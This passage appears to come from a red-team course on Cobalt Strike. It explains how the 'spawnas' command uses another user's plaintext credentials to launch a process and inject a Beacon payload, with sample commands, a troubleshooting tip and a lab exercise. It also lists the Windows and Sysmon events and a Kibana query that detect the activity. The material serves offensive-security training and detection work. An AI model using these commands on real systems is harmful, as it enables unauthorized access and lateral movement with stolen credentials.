The `spawnas` command will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it. This creates a new logon session with the interactive logon type which makes it good for local actions, but also creates a whole user profile on disk if not already present.
```shell
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```

>A common mistake is to attempt this from a directory where the target user does not have read access.
>```shell
>beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local [-] could not run C:\Windows\system32\rundll32.exe as DEV\jking: 267 [-] Could not connect to target
>```
>`cd` to a another directory like `C:\` and try again.

This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.

Like `make_token`, this will generate Windows event `4624: An account was successfully logged on` but with a logon type of `2` (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

It will also generate Sysmon event 1 (Process Create).  Because Cobalt Strike spawns rundll32 by default, we can find it by filtering on the process image.
```shell
event.type: process_start and process.name: rundll32.exe
```

>Use `spawnas` to spawn a payload as a different user and find the evidence in Kibana.
